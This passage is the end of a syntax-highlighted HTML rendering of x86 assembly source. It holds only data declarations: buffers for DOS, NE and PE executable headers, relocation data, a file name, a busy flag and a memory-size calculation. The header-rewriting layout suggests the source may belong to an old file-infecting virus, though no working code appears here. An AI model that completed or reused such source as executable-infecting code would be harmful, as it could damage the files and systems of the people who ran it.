</span><span class="sc5">PEObjectSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc5">NEObjectSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">08h</span><span class="sc0">

</span><span class="sc5">RelocTable</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">RelocTableSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Don't move this anywhere</span><span class="sc0">
</span><span class="sc5">DosHeader</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">DosHeaderSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WinHeader</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">WinHeaderSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WinObject</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">WinObjectSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WinHeaderOfs</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WinObjectOfs</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Busy</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MemSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">))/</span><span class="sc2">4096</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Code32</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">StartMZ</span><span class="sc0">
</span></div></body>
</html>
